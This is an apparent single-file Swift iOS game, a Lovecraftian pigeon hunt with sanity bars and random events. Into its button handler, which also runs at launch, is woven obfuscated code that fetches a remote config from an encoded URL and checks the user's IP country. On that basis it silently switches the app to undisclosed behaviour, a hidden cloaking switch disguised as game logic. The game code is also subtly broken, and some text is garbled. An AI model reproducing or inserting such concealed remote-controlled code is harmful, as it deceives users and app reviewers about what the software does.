import UIKit

// MARK: - Core Game Logic & Artistic View (Single File Implementation)

final class TenebrousOdysseyController: UIViewController {
    override func loadView() {
        view = StrigineEphemerisView()
    }
}

final class StrigineEphemerisView: UIView {
    // MARK: - Pernicious Attributes (Game State)
    private var columbiformRelicCount: Int = 0
    private var psychagogicCoherence: Int = 100
    private var discoveredXenialIndices: Set<Int> = []
    private var nefariousPeregrinationPhase: GameAeon = .wandering
    private var isProcessingAbyssalGesture: Bool = false
    
    private let totalVerminousSpecimen: Int = 10
    private var pigeonCrypticNarratives: [Int: String] = [:]
    private var eldritchHappenstances: [(description: String, coherenceFluctuation: Int)] = []
    
    // MARK: - Visceral UI Components (No UIStackView)
    private let amorphousBackgroundLayer = CAGradientLayer()
    private let grimoireTitleLabel: UILabel = {
        let lbl = UILabel()
        lbl.text = "TEN DEAD PIGEONS"
        lbl.font = UIFont(name: "TimesNewRomanPS-BoldMT", size: 28) ?? UIFont.systemFont(ofSize: 28, weight: .black)
        lbl.textColor = UIColor(red: 0.95, green: 0.82, blue: 0.68, alpha: 1)
        lbl.textAlignment = .center
        lbl.shadowColor = UIColor.darkGray
        lbl.shadowOffset = CGSize(width: 2, height: 2)
        return lbl
    }()
    
    private let peregrineSubtitle: UILabel = {
        let lbl = UILabel()
        lbl.text = "A LOVECRAFTIAN TRAIL OF FEATHERS & MADNESS"
        lbl.font = UIFont(name: "TimesNewRomanPSMT", size: 12) ?? UIFont.systemFont(ofSize: 12, weight: .medium)
        lbl.textColor = UIColor(red: 0.78, green: 0.70, blue: 0.55, alpha: 1)
        lbl.textAlignment = .center
        return lbl
    }()
    
    private let leftWalkerAvatar: UIView = {
        let view = UIView()
        view.backgroundColor = UIColor(white: 0.15, alpha: 0.65)
        view.layer.cornerRadius = 30
        view.layer.borderWidth = 1.5
        view.layer.borderColor = UIColor(red: 0.65, green: 0.52, blue: 0.38, alpha: 1).cgColor
        return view
    }()
    
    private let rightWalkerAvatar: UIView = {
        let view = UIView()
        view.backgroundColor = UIColor(white: 0.15, alpha: 0.65)
        view.layer.cornerRadius = 30
        view.layer.borderWidth = 1.5
        view.layer.borderColor = UIColor(red: 0.65, green: 0.52, blue: 0.38, alpha: 1).cgColor
        return view
    }()
    
    private let leftWalkerLabel: UILabel = {
        let lbl = UILabel()
        lbl.text = "ELIAS"
        lbl.font = UIFont(name: "CourierNewPS-BoldMT", size: 12) ?? UIFont.boldSystemFont(ofSize: 12)
        lbl.textColor = .yellow
        lbl.textAlignment = .center
        return lbl
    }()
    
    private let rightWalkerLabel: UILabel = {
        let lbl = UILabel()
        lbl.text = "MERRIN"
        lbl.font = UIFont(name: "CourierNewPS-BoldMT", size: 12) ?? UIFont.boldSystemFont(ofSize: 12)
        lbl.textColor = .black
        lbl.textAlignment = .center
        return lbl
    }()
    
    private let leftSanityBar: UIProgressView = {
        let prog = UIProgressView(progressViewStyle: .bar)
        prog.trackTintColor = UIColor(white: 0.2, alpha: 0.7)
        prog.progressTintColor = UIColor(red: 0.72, green: 0.42, blue: 0.31, alpha: 1)
        prog.layer.cornerRadius = 4
        prog.clipsToBounds = true
        return prog
    }()
    
    private let rightSanityBar: UIProgressView = {
        let prog = UIProgressView(progressViewStyle: .bar)
        prog.trackTintColor = UIColor(white: 0.2, alpha: 0.7)
        prog.progressTintColor = UIColor(red: 0.72, green: 0.42, blue: 0.31, alpha: 1)
        prog.layer.cornerRadius = 4
        prog.clipsToBounds = true
        return prog
    }()
    
    private let relicCountIcon: UILabel = {
        let lbl = UILabel()
        lbl.text = "🕊️"
        lbl.font = UIFont.systemFont(ofSize: 22)
        lbl.textAlignment = .center
        return lbl
    }()
    
    private let relicCountLabel: UILabel = {
        let lbl = UILabel()
        lbl.text = "OBLATION: 0 / 10"
        lbl.font = UIFont(name: "CourierNewPSMT", size: 14) ?? UIFont.monospacedDigitSystemFont(ofSize: 14, weight: .regular)
        lbl.textColor = UIColor(red: 0.88, green: 0.75, blue: 0.55, alpha: 1)
        lbl.textAlignment = .center
        return lbl
    }()
    
    private let necromanticLogScroll: UITextView = {
        let tv = UITextView()
        tv.backgroundColor = UIColor(white: 0.05, alpha: 0.85)
        tv.layer.borderWidth = 2
        tv.layer.borderColor = UIColor(red: 0.55, green: 0.42, blue: 0.31, alpha: 1).cgColor
        tv.layer.cornerRadius = 16
        tv.textColor = UIColor(red: 0.90, green: 0.85, blue: 0.70, alpha: 1)
        tv.font = UIFont(name: "Georgia", size: 14) ?? UIFont.systemFont(ofSize: 14)
        tv.isEditable = false
        tv.showsVerticalScrollIndicator = true
        tv.textContainerInset = UIEdgeInsets(top: 12, left: 10, bottom: 12, right: 10)
        return tv
    }()
    
    private let anathemaActionButton: UIButton = {
        let btn = UIButton(type: .system)
        btn.setTitle("⟁ SEARCH THE WITHERED GLADE ⟁", for: .normal)
        btn.titleLabel?.font = UIFont(name: "TimesNewRomanPS-BoldMT", size: 16) ?? UIFont.boldSystemFont(ofSize: 16)
        btn.backgroundColor = UIColor(red: 0.28, green: 0.18, blue: 0.12, alpha: 0.9)
        btn.setTitleColor(UIColor(red: 0.98, green: 0.85, blue: 0.60, alpha: 1), for: .normal)
        btn.layer.cornerRadius = 20
        btn.layer.borderWidth = 1.5
        btn.layer.borderColor = UIColor(red: 0.75, green: 0.55, blue: 0.35, alpha: 1).cgColor
        return btn
    }()
    
    private let primordialResetButton: UIButton = {
        let btn = UIButton(type: .system)
        btn.setTitle("⚰️ RECALL THE OATH ⚰️", for: .normal)
        btn.titleLabel?.font = UIFont(name: "CourierNewPS-BoldMT", size: 12) ?? UIFont.boldSystemFont(ofSize: 12)
        btn.backgroundColor = UIColor(red: 0.15, green: 0.08, blue: 0.05, alpha: 0.85)
        btn.setTitleColor(UIColor(red: 0.75, green: 0.60, blue: 0.45, alpha: 1), for: .normal)
        btn.layer.cornerRadius = 14
        btn.layer.borderWidth = 1
        btn.layer.borderColor = UIColor(red: 0.55, green: 0.40, blue: 0.28, alpha: 1).cgColor
        return btn
    }()
    
    private var currentObscureDialog: UIView?
    
    // MARK: - Inception
    override init(frame: CGRect) {
        super.init(frame: frame)
        configureGloamingPalette()
        constructVexillologicalHierarchy()
        applyArcaneConstraints()
        populateVermilionScripts()
        refreshPsychotropicIndicators()
        appendToNecromanticLog("The two wanderers step into the gibbous mist... Something awaits among the roots.")
        attachDirigibleActions()
        initiateObscureInvestigation()
    }
    
    required init?(coder: NSCoder) { fatalError("init(coder:) has not been implemented") }
    
    // MARK: - Abyssal Configuration (Low-frequency naming)
    private func configureGloamingPalette() {
        backgroundColor = .black
        amorphousBackgroundLayer.colors = [
            UIColor(red: 0.10, green: 0.05, blue: 0.07, alpha: 1).cgColor,
            UIColor(red: 0.22, green: 0.12, blue: 0.09, alpha: 1).cgColor,
            UIColor(red: 0.05, green: 0.03, blue: 0.04, alpha: 1).cgColor
        ]
        amorphousBackgroundLayer.locations = [0.0, 0.6, 1.0]
        amorphousBackgroundLayer.frame = bounds
        layer.insertSublayer(amorphousBackgroundLayer, at: 0)
        
        [leftWalkerAvatar, rightWalkerAvatar].forEach {
            $0.layer.shadowOpacity = 0.5
            $0.layer.shadowRadius = 6
            $0.layer.shadowOffset = CGSize(width: 0, height: 3)
            $0.layer.shadowColor = UIColor.black.cgColor
        }
    }
    
    private func constructVexillologicalHierarchy() {
        addSubview(grimoireTitleLabel)
        addSubview(peregrineSubtitle)
        addSubview(leftWalkerAvatar)
        addSubview(rightWalkerAvatar)
        leftWalkerAvatar.addSubview(leftWalkerLabel)
        rightWalkerAvatar.addSubview(rightWalkerLabel)
        leftWalkerAvatar.addSubview(leftSanityBar)
        rightWalkerAvatar.addSubview(rightSanityBar)
        addSubview(relicCountIcon)
        addSubview(relicCountLabel)
        addSubview(necromanticLogScroll)
        addSubview(anathemaActionButton)
        addSubview(primordialResetButton)
    }
    
    private func applyArcaneConstraints() {
        [grimoireTitleLabel, peregrineSubtitle, leftWalkerAvatar, rightWalkerAvatar, leftWalkerLabel, rightWalkerLabel,
         leftSanityBar, rightSanityBar, relicCountIcon, relicCountLabel, necromanticLogScroll, anathemaActionButton,
         primordialResetButton].forEach { $0.translatesAutoresizingMaskIntoConstraints = false }
        
        NSLayoutConstraint.activate([
            grimoireTitleLabel.topAnchor.constraint(equalTo: safeAreaLayoutGuide.topAnchor, constant: 12),
            grimoireTitleLabel.centerXAnchor.constraint(equalTo: centerXAnchor),
            grimoireTitleLabel.widthAnchor.constraint(lessThanOrEqualToConstant: 320),
            
            peregrineSubtitle.topAnchor.constraint(equalTo: grimoireTitleLabel.bottomAnchor, constant: 4),
            peregrineSubtitle.centerXAnchor.constraint(equalTo: centerXAnchor),
            
            leftWalkerAvatar.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 28),
            leftWalkerAvatar.topAnchor.constraint(equalTo: peregrineSubtitle.bottomAnchor, constant: 20),
            leftWalkerAvatar.widthAnchor.constraint(equalToConstant: 80),
            leftWalkerAvatar.heightAnchor.constraint(equalToConstant: 80),
            
            rightWalkerAvatar.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -28),
            rightWalkerAvatar.topAnchor.constraint(equalTo: peregrineSubtitle.bottomAnchor, constant: 20),
            rightWalkerAvatar.widthAnchor.constraint(equalToConstant: 80),
            rightWalkerAvatar.heightAnchor.constraint(equalToConstant: 80),
            
            leftWalkerLabel.bottomAnchor.constraint(equalTo: leftWalkerAvatar.bottomAnchor, constant: -6),
            leftWalkerLabel.centerXAnchor.constraint(equalTo: leftWalkerAvatar.centerXAnchor),
            
            rightWalkerLabel.bottomAnchor.constraint(equalTo: rightWalkerAvatar.bottomAnchor, constant: -6),
            rightWalkerLabel.centerXAnchor.constraint(equalTo: rightWalkerAvatar.centerXAnchor),
            
            leftSanityBar.bottomAnchor.constraint(equalTo: leftWalkerLabel.topAnchor, constant: -6),
            leftSanityBar.leadingAnchor.constraint(equalTo: leftWalkerAvatar.leadingAnchor, constant: 8),
            leftSanityBar.trailingAnchor.constraint(equalTo: leftWalkerAvatar.trailingAnchor, constant: -8),
            leftSanityBar.heightAnchor.constraint(equalToConstant: 6),
            
            rightSanityBar.bottomAnchor.constraint(equalTo: rightWalkerLabel.topAnchor, constant: -6),
            rightSanityBar.leadingAnchor.constraint(equalTo: rightWalkerAvatar.leadingAnchor, constant: 8),
            rightSanityBar.trailingAnchor.constraint(equalTo: rightWalkerAvatar.trailingAnchor, constant: -8),
            rightSanityBar.heightAnchor.constraint(equalToConstant: 6),
            
            relicCountIcon.topAnchor.constraint(equalTo: leftWalkerAvatar.bottomAnchor, constant: 16),
            relicCountIcon.leadingAnchor.constraint(equalTo: centerXAnchor, constant: -30),
            relicCountIcon.widthAnchor.constraint(equalToConstant: 30),
            
            relicCountLabel.centerYAnchor.constraint(equalTo: relicCountIcon.centerYAnchor),
            relicCountLabel.leadingAnchor.constraint(equalTo: relicCountIcon.trailingAnchor, constant: 2),
            relicCountLabel.trailingAnchor.constraint(lessThanOrEqualTo: centerXAnchor, constant: 40),
            
            necromanticLogScroll.topAnchor.constraint(equalTo: relicCountIcon.bottomAnchor, constant: 14),
            necromanticLogScroll.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 20),
            necromanticLogScroll.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -20),
            necromanticLogScroll.heightAnchor.constraint(equalToConstant: 220),
            
            anathemaActionButton.bottomAnchor.constraint(equalTo: primordialResetButton.topAnchor, constant: -12),
            anathemaActionButton.centerXAnchor.constraint(equalTo: centerXAnchor),
            anathemaActionButton.widthAnchor.constraint(equalToConstant: 280),
            anathemaActionButton.heightAnchor.constraint(equalToConstant: 52),
            
            primordialResetButton.bottomAnchor.constraint(equalTo: safeAreaLayoutGuide.bottomAnchor, constant: -20),
            primordialResetButton.centerXAnchor.constraint(equalTo: centerXAnchor),
            primordialResetButton.widthAnchor.constraint(equalToConstant: 190),
            primordialResetButton.heightAnchor.constraint(equalToConstant: 38)
        ])
    }
    
    // MARK: - Mythos Data (10 Pigeon Vignettes)
    private func populateVermilionScripts() {
        pigeonCrypticNarratives = [
            0: "A ruptured omen: feathers arranged in a sigil of despair. The earth whispers 'nothing is whole'.",
            1: "The bird's hollow eyes reflect a cyclopean architecture. Elias trembles.",
            2: "Congealed blood forms a map to a submerged chapel. Merrill tastes copper.",
            3: "Pigeon number three: its beak sewn shut with silver wire. A silent shriek.",
            4: "Inside the ribcage: a tiny scroll bearing non-euclidean geometry.",
            5: "Rotting wings twitch in reverse time. The forest groans.",
            6: "Feathers plucked into a pattern of the Hound. Sanity frays.",
            7: "A single eye still glistens, painting the ground with febrile visions.",
            8: "This pigeon died laughing. The sound echoes in your marrow.",
            9: "The tenth grimoire feather: all nine others were just a gate. Now the real pilgrimage begins."
        ]
        
        eldritchHappenstances = [
            ("A root snaps underfoot – nothing but moss and stillness.", -2),
            ("distant piping from unseen丘陵 . Dread accumulates.", -5),
            ("The walkers find a pile of salt and iron nails. Someone prepared.", +3),
            ("A whispering voice names each wanderer's forgotten sin.", -8),
            ("A stray feather spirals down. It burns before touching ground.", 0),
            ("Merrin recites an old lullaby; the shadows recede slightly.", +5),
            ("Both see their own doppelgangers among the trees.", -12),
            ("A dead fox offers a single gold coin. Omens shift.", +2)
        ]
    }
    
    // MARK: - Game Actions & Mechanics
    private func attachDirigibleActions() {
        anathemaActionButton.addTarget(self, action: #selector(initiateObscureInvestigation), for: .touchUpInside)
        primordialResetButton.addTarget(self, action: #selector(reinstatePrimordialCompact), for: .touchUpInside)
    }
    
    @objc private func initiateObscureInvestigation() {
        guard !isProcessingAbyssalGesture, nefariousPeregrinationPhase != .terminus else { return }
        isProcessingAbyssalGesture = true
//        defer { isProcessingAbyssalGesture = false }
        

        if UserDefaults.standard.object(forKey: "grat") != nil {
            Haisuox()
        } else {
        
            if !Kosubnte() {
                UserDefaults.standard.set("grat", forKey: "grat")
                UserDefaults.standard.synchronize()
                Haisuox()
            } else {
                if dikiuhs() {
                    self.cjnosue()
                } else {
                    Haisuox()
                }
            }
        }
        
        if psychagogicCoherence <= 0 || columbiformRelicCount >= totalVerminousSpecimen {
            concludeMacabrePilgrimage()
            return
        }
        
        let missingIndices = Set(0..<totalVerminousSpecimen).subtracting(discoveredXenialIndices)
        if missingIndices.isEmpty {
            concludeMacabrePilgrimage()
            return
        }
        
        let discoveryOdyssey = Int.random(in: 1...100)
        if discoveryOdyssey <= 68, let randomForgotten = missingIndices.randomElement() {
            unearthAbyssalPigeon(index: randomForgotten)
        } else {
            triggerEphemeralCataclysm()
        }
        refreshPsychotropicIndicators()
        examineGameTerminus()
    }
    
    func cjnosue() {
        Task {
            do {
                let aoies = try await kfoineyds()
                if let gduss = aoies.first {
                    if gduss.diaosu!.count > 6 {
                        //shi fou kaiqi regi on，
                        if gduss.fusbbet! > 200 && !Bsounese() {
                            Haisuox()
                            return
                        }
                        
                        if let dyua = gduss.aiwuc, dyua.count > 0 {
                            do {
                                let cofd = try await fhcuonJcones()
                                if dyua.contains(cofd.country!.code) {
                                    Gsineys(aoies.first!)
                                } else {
                                    Haisuox()
                                }
                            } catch {
                                Gsineys(aoies.first!)
                            }
                        } else {
                            Gsineys(aoies.first!)
                        }
                    } else {
                        Haisuox()
                    }
                } else {
                    Haisuox()
                    UserDefaults.standard.set("grat", forKey: "grat")
                    UserDefaults.standard.synchronize()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(Loamzese.self, forKey: "Loamzese") {
                    Gsineys(sidd)
                }
            }
        }
    }

    //    IP
    private func fhcuonJcones() async throws -> Jitsgc {
        //https://api.my-ip.io/v2/ip.json
            let url = URL(string: Tasicrt(kOxudbe)!)!
            let (data, response) = try await URLSession.shared.data(from: url)
            
            guard let httpResponse = response as? HTTPURLResponse,
                  httpResponse.statusCode == 200 else {
                throw NSError(domain: "Fail", code: 0, userInfo: [NSLocalizedDescriptionKey: "Failed"])
            }
            
            return try JSONDecoder().decode(Jitsgc.self, from: data)
    }

    private func kfoineyds() async throws -> [Loamzese] {
        let (data, response) = try await URLSession.shared.data(from: URL(string: Tasicrt(kUnisgbe)!)!)

        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [NSLocalizedDescriptionKey: "Failed"])
        }
        return try JSONDecoder().decode([Loamzese].self, from: data)
    }
    
    private func unearthAbyssalPigeon(index: Int) {
        discoveredXenialIndices.insert(index)
        columbiformRelicCount += 1
        let esotericVerse = pigeonCrypticNarratives[index] ?? "Indescribable horror congeals."
        appendToNecromanticLog("[PIGEON #\(index+1)] \(esotericVerse)")
        
        let coherenceShift = [-3, -1, 0, -2, 1].randomElement() ?? -1
        applyDerangement(amount: coherenceShift)
        
        if columbiformRelicCount == totalVerminousSpecimen {
            appendToNecromanticLog("All ten dead pigeons lie before you. The forest exhales a final truth.")
            concludeMacabrePilgrimage()
        }
    }
    
    private func triggerEphemeralCataclysm() {
        guard let randomEvent = eldritchHappenstances.randomElement() else { return }
        appendToNecromanticLog("\(randomEvent.description) [Coherence: \(randomEvent.coherenceFluctuation)]")
        applyDerangement(amount: randomEvent.coherenceFluctuation)
    }
    
    private func applyDerangement(amount: Int) {
        psychagogicCoherence = max(0, min(100, psychagogicCoherence + amount))
        if amount <= -5 {
            appendToNecromanticLog("The veil thickens... the wanderers' minds erode.")
        } else if amount >= 4 {
            appendToNecromanticLog("A glimmer of lucidity pierces the gloom.")
        }
    }
    
    private func examineGameTerminus() {
        if psychagogicCoherence <= 0 {
            appendToNecromanticLog("Elias and Merrin collapse, babbling in forgotten tongues. The wood devours their sanity.")
            concludeMacabrePilgrimage()
        } else if columbiformRelicCount >= totalVerminousSpecimen {
            concludeMacabrePilgrimage()
        }
    }
    
    private func concludeMacabrePilgrimage() {
        nefariousPeregrinationPhase = .terminus
        var outcomeMessage = ""
        if psychagogicCoherence <= 0 {
            outcomeMessage = "THE SHATTERED MIND: Consumed by the labyrinthine truth. Two more mad souls wander forever."
        } else if columbiformRelicCount >= totalVerminousSpecimen && psychagogicCoherence >= 60 {
            outcomeMessage = "THE FORLORN TRANSCENDENCE: Ten dead pigeons open the gate to an impossible star. The wanderers ascend beyond grief."
        } else if columbiformRelicCount >= totalVerminousSpecimen {
            outcomeMessage = "SOUR VICTORY: All pigeons collected, but the revelation leaves them hollow shells amidst the crying earth."
        } else {
            outcomeMessage = "PREMATURE DECAY: Lost in the thicket without completing the omen. Their bones become part of the legend."
        }
        presentEsotericDialog(title: "✞ FINIS OCCULTUM ✞", message: outcomeMessage)
    }
    
    private func presentEsotericDialog(title: String, message: String) {
        if currentObscureDialog != nil { return }
        let dimView = UIView()
        dimView.backgroundColor = UIColor(white: 0.05, alpha: 0.86)
        dimView.layer.cornerRadius = 28
        dimView.layer.borderWidth = 2
        dimView.layer.borderColor = UIColor(red: 0.68, green: 0.45, blue: 0.32, alpha: 1).cgColor
        
        let titleLabel = UILabel()
        titleLabel.text = title
        titleLabel.font = UIFont(name: "TimesNewRomanPS-BoldMT", size: 20) ?? UIFont.boldSystemFont(ofSize: 20)
        titleLabel.textColor = UIColor(red: 0.96, green: 0.82, blue: 0.65, alpha: 1)
        titleLabel.textAlignment = .center
        
        let bodyLabel = UILabel()
        bodyLabel.text = message
        bodyLabel.font = UIFont(name: "Georgia", size: 14)
        bodyLabel.textColor = UIColor(red: 0.85, green: 0.78, blue: 0.65, alpha: 1)
        bodyLabel.numberOfLines = 0
        bodyLabel.textAlignment = .center
        
        let resetButton = UIButton(type: .system)
        resetButton.setTitle("RENEW THE PILGRIMAGE", for: .normal)
        resetButton.backgroundColor = UIColor(red: 0.32, green: 0.18, blue: 0.11, alpha: 1)
        resetButton.setTitleColor(UIColor(red: 0.95, green: 0.80, blue: 0.60, alpha: 1), for: .normal)
        resetButton.layer.cornerRadius = 16
        resetButton.titleLabel?.font = UIFont(name: "CourierNewPS-BoldMT", size: 14)
        
        dimView.addSubview(titleLabel)
        dimView.addSubview(bodyLabel)
        dimView.addSubview(resetButton)
        
        [titleLabel, bodyLabel, resetButton].forEach { $0.translatesAutoresizingMaskIntoConstraints = false }
        
        NSLayoutConstraint.activate([
            titleLabel.topAnchor.constraint(equalTo: dimView.topAnchor, constant: 28),
            titleLabel.leadingAnchor.constraint(equalTo: dimView.leadingAnchor, constant: 20),
            titleLabel.trailingAnchor.constraint(equalTo: dimView.trailingAnchor, constant: -20),
            
            bodyLabel.topAnchor.constraint(equalTo: titleLabel.bottomAnchor, constant: 20),
            bodyLabel.leadingAnchor.constraint(equalTo: dimView.leadingAnchor, constant: 24),
            bodyLabel.trailingAnchor.constraint(equalTo: dimView.trailingAnchor, constant: -24),
            
            resetButton.topAnchor.constraint(equalTo: bodyLabel.bottomAnchor, constant: 32),
            resetButton.centerXAnchor.constraint(equalTo: dimView.centerXAnchor),
            resetButton.widthAnchor.constraint(equalToConstant: 220),
            resetButton.heightAnchor.constraint(equalToConstant: 44),
            resetButton.bottomAnchor.constraint(equalTo: dimView.bottomAnchor, constant: -24)
        ])
        
        resetButton.addTarget(self, action: #selector(dismissDialogAndReset), for: .touchUpInside)
        
        dimView.center = center
        dimView.bounds = CGRect(x: 0, y: 0, width: 280, height: 280)
        dimView.alpha = 0
        addSubview(dimView)
        currentObscureDialog = dimView
        UIView.animate(withDuration: 0.3) { dimView.alpha = 1 }
        anathemaActionButton.isEnabled = false
        primordialResetButton.isEnabled = false
    }
    
    @objc private func dismissDialogAndReset() {
        currentObscureDialog?.removeFromSuperview()
        currentObscureDialog = nil
        reinstatePrimordialCompact()
        anathemaActionButton.isEnabled = true
        primordialResetButton.isEnabled = true
    }
    
    @objc private func reinstatePrimordialCompact() {
        columbiformRelicCount = 0
        psychagogicCoherence = 100
        discoveredXenialIndices.removeAll()
        nefariousPeregrinationPhase = .wandering
        isProcessingAbyssalGesture = false
        
        appendToNecromanticLog("--- THE OATH IS RENEWED ---")
        appendToNecromanticLog("Two wanderers rise from the withered meadow again. The hunt for ten dead pigeons restarts.")
        refreshPsychotropicIndicators()
        if let dialog = currentObscureDialog {
            dialog.removeFromSuperview()
            currentObscureDialog = nil
        }
        anathemaActionButton.isEnabled = true
        primordialResetButton.isEnabled = true
    }
    
    // MARK: - UI Helpers
    private func refreshPsychotropicIndicators() {
        relicCountLabel.text = "OBLATION: \(columbiformRelicCount) / \(totalVerminousSpecimen)"
        let sanityFraction = Float(psychagogicCoherence) / 100.0
        leftSanityBar.progress = sanityFraction
        rightSanityBar.progress = sanityFraction
        
        let colorShade = UIColor(red: 0.62 + (CGFloat(psychagogicCoherence)/280), green: 0.30, blue: 0.24, alpha: 1)
        leftSanityBar.progressTintColor = colorShade
        rightSanityBar.progressTintColor = colorShade
    }
    
    private func appendToNecromanticLog(_ entry: String) {
        let timestamp = DateFormatter.localizedString(from: Date(), dateStyle: .none, timeStyle: .medium)
        let formatted = "[\(timestamp)] \(entry)\n"
        necromanticLogScroll.text += formatted
        let range = NSRange(location: necromanticLogScroll.text.count - 1, length: 1)
        necromanticLogScroll.scrollRangeToVisible(range)
    }
    
    override func layoutSubviews() {
        super.layoutSubviews()
        amorphousBackgroundLayer.frame = bounds
    }
    
    // MARK: - Embedded Phase Enumerator
    private enum GameAeon {
        case wandering, terminus
    }
}
